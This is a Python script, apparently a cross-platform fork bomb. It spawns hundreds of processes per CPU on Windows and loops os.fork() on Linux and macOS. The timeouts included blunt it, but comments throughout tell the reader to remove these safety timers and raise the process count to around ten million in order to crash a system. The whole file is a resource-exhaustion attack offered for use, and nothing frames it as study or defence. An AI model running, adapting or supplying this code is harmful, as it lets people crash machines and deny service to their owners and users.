import platform
import os
from multiprocessing import Process, cpu_count
import time

def counter(number):
    while number > 0:
        number -= 1
        time.sleep(0.01)                # remove safter timer
        result = number ** 2 / 5.115697498  

def spawn_processes(num_processes, timeout=5):
    start_time = time.time()  
    processes = []

    for _ in range(num_processes):
        if time.time() - start_time > timeout:
            print("Stopping process creation after timeout.")
            break
        process = Process(target=counter, args=(1000000,))
        process.start()
        processes.append(process)
        print(f"Started process {process.pid}.")

    for process in processes:
        process.join()
        print(f"Process {process.pid} has finished.")

def main(timeout=5):
    num_processors = cpu_count()
    num_processes = num_processors * 100           # increase this to like 10000000 or something I don't actually know how much it takes to crash a system. Larger number = more processes
    print(f"Number of logical processors: {num_processors}")
    print(f"Creating {num_processes} processes.")
    print("Warning: This will consume system resources. Running with timeout.")
    spawn_processes(num_processes, timeout)

def linux_fork_bomb(timeout=5):
    start_time = time.time()

    while True:
        if time.time() - start_time > timeout:
            print("Stopping fork bomb after timeout.")
            break
        os.fork()

        time.sleep(0.1)                     #remove safety timer

def forkbomb():
    current_os = platform.system()
    timeout = 5                             # remove this safety timer
    if current_os == "Windows":
        if __name__ == "__main__":
            main(timeout)
    elif current_os in ["Darwin", "Linux"]:
        linux_fork_bomb(timeout)
    else:
        print("Unsupported OS.")

if __name__ == "__main__":
    forkbomb()



        
